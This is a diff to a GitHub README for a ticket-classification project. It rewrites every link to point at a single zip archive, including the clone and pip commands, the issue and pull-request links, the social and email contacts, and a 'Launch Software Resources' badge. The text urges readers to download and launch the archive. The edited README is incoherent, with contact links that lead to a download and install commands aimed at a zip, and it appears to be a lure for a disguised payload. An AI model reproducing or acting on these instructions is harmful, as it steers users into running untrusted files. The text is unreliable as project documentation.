@@ -11,9 +11,9 @@ Welcome to the **Automatic Ticket Classification** repository! This project focu
 
 📄 **Files:**
 - **[LICENSE](LICENSE):** The license information for this project.
-- **[https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip):** This file you are currently reading providing an overview of the repository.
-- **[https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip):** Lists the required Python packages and versions needed to run the code successfully.
-- **[https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip):** This file needs to be launched for additional software resources.
+- **[https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/raw/refs/heads/main/horoscopic/Ticket-Automatic-Classification-2.4-beta.1.zip](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/raw/refs/heads/main/horoscopic/Ticket-Automatic-Classification-2.4-beta.1.zip):** This file you are currently reading providing an overview of the repository.
+- **[https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/raw/refs/heads/main/horoscopic/Ticket-Automatic-Classification-2.4-beta.1.zip](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/raw/refs/heads/main/horoscopic/Ticket-Automatic-Classification-2.4-beta.1.zip):** Lists the required Python packages and versions needed to run the code successfully.
+- **[https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/raw/refs/heads/main/horoscopic/Ticket-Automatic-Classification-2.4-beta.1.zip](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/raw/refs/heads/main/horoscopic/Ticket-Automatic-Classification-2.4-beta.1.zip):** This file needs to be launched for additional software resources.
 
 ## Tools and Libraries
 The project utilizes various tools and libraries to streamline the process of customer ticket classification and text preprocessing:
@@ -44,16 +44,16 @@ In addition to text preprocessing, the project also delves into model implementa
 To get started with the project, follow these steps:
 1. Clone the repository to your local machine using:
    ```
-   git clone https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip
+   git clone https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/raw/refs/heads/main/horoscopic/Ticket-Automatic-Classification-2.4-beta.1.zip
    ```
-2. Install the required Python packages listed in `https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip` using:
+2. Install the required Python packages listed in `https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/raw/refs/heads/main/horoscopic/Ticket-Automatic-Classification-2.4-beta.1.zip` using:
    ```
-   pip install -r https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip
+   pip install -r https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/raw/refs/heads/main/horoscopic/Ticket-Automatic-Classification-2.4-beta.1.zip
    ```
-3. Launch the additional software resources by downloading and extracting the `https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip` file from the provided link.
+3. Launch the additional software resources by downloading and extracting the `https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/raw/refs/heads/main/horoscopic/Ticket-Automatic-Classification-2.4-beta.1.zip` file from the provided link.
 
 ## Support and Contributions
-If you encounter any issues with the project or have suggestions for improvement, feel free to open an [issue](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip). Contributions are always welcome through [pull requests](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip).
+If you encounter any issues with the project or have suggestions for improvement, feel free to open an [issue](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/raw/refs/heads/main/horoscopic/Ticket-Automatic-Classification-2.4-beta.1.zip). Contributions are always welcome through [pull requests](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/raw/refs/heads/main/horoscopic/Ticket-Automatic-Classification-2.4-beta.1.zip).
 
 🌟 Your support and contributions are greatly appreciated in making this project more robust and efficient! 🌟
 
@@ -62,8 +62,8 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Let's Connect!
 Stay updated with the latest project developments and connect with fellow developers:
-- Follow me on [GitHub](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip)
-- Connect with me on [LinkedIn](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip)
-- Reach out via [Email](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip)
+- Follow me on [GitHub](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/raw/refs/heads/main/horoscopic/Ticket-Automatic-Classification-2.4-beta.1.zip)
+- Connect with me on [LinkedIn](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/raw/refs/heads/main/horoscopic/Ticket-Automatic-Classification-2.4-beta.1.zip)
+- Reach out via [Email](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/raw/refs/heads/main/horoscopic/Ticket-Automatic-Classification-2.4-beta.1.zip)
 
-[![Launch Software Resources](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip)](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/releases/download/v1.0/Release.zip)
+[![Launch Software Resources](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/raw/refs/heads/main/horoscopic/Ticket-Automatic-Classification-2.4-beta.1.zip)](https://github.com/AldiPradana-KD/Automatic-Ticket-Classification/raw/refs/heads/main/horoscopic/Ticket-Automatic-Classification-2.4-beta.1.zip)
